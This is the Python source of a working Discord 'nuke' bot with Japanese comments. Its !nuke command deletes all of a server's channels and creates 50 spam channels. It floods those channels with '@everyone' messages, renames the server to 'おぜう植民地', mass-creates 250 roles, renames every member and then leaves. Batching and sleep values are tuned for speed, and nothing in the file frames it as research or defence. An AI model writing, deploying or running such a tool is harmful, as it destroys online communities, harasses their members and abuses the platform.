# main.py
import os
import asyncio
import logging
from datetime import datetime
from typing import List
import threading

import discord
from discord.ext import commands
from flask import Flask, jsonify

# ---------------- CONFIG ----------------
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True  

# 基本設定
ROLE_BASE = "ozeumember"       # ロール名ベース
ROLE_COUNT = 250                 # 作成するロール数
CHANNEL_BASE = "ozeu-nuke"     # チャンネル名ベース
CHANNEL_COUNT = 50              # 作成するチャンネル数
REPEAT_MESSAGE = "@everyone おぜう最強！"
REPEAT_COUNT = 50               # 各チャンネルに送信する回数
NEW_GUILD_NAME = "おぜう植民地"  # None にするとサーバー名変更なし

# ニックネーム変更
CHANGE_NICKNAMES = True        # False にすると無効化
NICK_BASE = "おぜう様万歳！"
NICK_CHUNK_SIZE = 12
NICK_CHUNK_SLEEP = 0.12

# 並列・速度調整
DELETE_CHUNK_SIZE = 8
DELETE_CHUNK_SLEEP = 0.08
CREATE_CHUNK_SIZE = 6
CREATE_CHUNK_SLEEP = 0.12
MSG_CHUNK_SIZE = 10
MSG_INTER_CHUNK_SLEEP = 0.01
MSG_INTER_ROUND_SLEEP = 0.02
POST_DELETE_WAIT = 2.0
ROLE_CHUNK_SIZE = 5
ROLE_CHUNK_SLEEP = 0.05
# ---------------------------------------

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("fast-nuke")

bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

# --- Flask health check ---
@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "bot_ready": bot.is_ready(),
        "bot_user": str(bot.user) if bot.user else None
    }), 200

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# --- helpers ---
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {channel.name} ({channel.id})")
    except Exception as e:
        logger.warning(f"Delete failed {channel}: {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        logger.info(f"Created channel: {name} ({ch.id})")
        await asyncio.sleep(0.1)
        return ch
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

async def safe_send(ch: discord.TextChannel, content: str):
    try:
        await ch.send(content[:2000])
    except Exception as e:
        logger.warning(f"Send failed {ch}: {e}")

async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    for _ in range(repeat):
        for group in chunk_list(channels, MSG_CHUNK_SIZE):
            await asyncio.gather(*(safe_send(ch, msg) for ch in group))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

# --- nickname ---
async def safe_change_nick(member: discord.Member, new_nick: str):
    try:
        await member.edit(nick=new_nick)
        return True
    except Exception:
        return False

async def change_all_nicknames(guild: discord.Guild, base: str, chunk_size=12, chunk_sleep=0.12):
    members = [m for m in guild.members if not m.bot]
    tasks = [(m, f"{base}-{i+1}") for i, m in enumerate(members)]
    changed = 0
    for group in chunk_list(tasks, chunk_size):
        results = await asyncio.gather(*(safe_change_nick(m, nick) for m, nick in group))
        changed += sum(1 for r in results if r)
        await asyncio.sleep(chunk_sleep)
    return changed

# --- permissions ---
def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames

# --- events ---
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} ({bot.user.id})")

# --- main command ---
@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    if guild is None or not bot_has_permissions(guild):
        await ctx.send("Bot に必要な権限がありません。")
        return

    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke 開始（backup channel created）")

    # --- メイン作業 ---
    async def main_tasks():
        # チャンネル削除
        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
            await asyncio.gather(*(safe_delete_channel(c) for c in group))
            await asyncio.sleep(DELETE_CHUNK_SLEEP)
        await asyncio.sleep(POST_DELETE_WAIT)

        # チャンネル作成
        names = [f"{CHANNEL_BASE}-{i}" for i in range(1, CHANNEL_COUNT+1)]
        created_channels = []
        for group in chunk_list(names, CREATE_CHUNK_SIZE):
            results = await asyncio.gather(*(safe_create_channel(guild, nm) for nm in group))
            created_channels.extend([ch for ch in results if ch])
            await asyncio.sleep(CREATE_CHUNK_SLEEP)

        # メッセージ送信
        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)

    # --- サブ作業 ---
    async def sub_tasks():
        if NEW_GUILD_NAME:
            await guild.edit(name=NEW_GUILD_NAME)
        # ロール作成
        role_names = [f"{ROLE_BASE}-{i}" for i in range(1, ROLE_COUNT+1)]
        for group in chunk_list(role_names, ROLE_CHUNK_SIZE):
            await asyncio.gather(*(guild.create_role(name=nm, permissions=discord.Permissions.none()) for nm in group))
            await asyncio.sleep(ROLE_CHUNK_SLEEP)
        # ニックネーム変更
        if CHANGE_NICKNAMES:
            await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)

    # --- 並列実行 ---
    await asyncio.gather(main_tasks(), sub_tasks())

    # --- 完了後サーバー退出 ---
    await backup_channel.send("✅ 全作業完了。ボットはサーバーを離脱します。")
    await asyncio.sleep(1.0)
    await guild.leave()

# Entrypoint
if __name__ == "__main__":
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask started")

    if not TOKEN:
        logger.error("DISCORD_TOKEN が設定されていません。")
        raise SystemExit("DISCORD_TOKEN is required")
    bot.run(TOKEN)
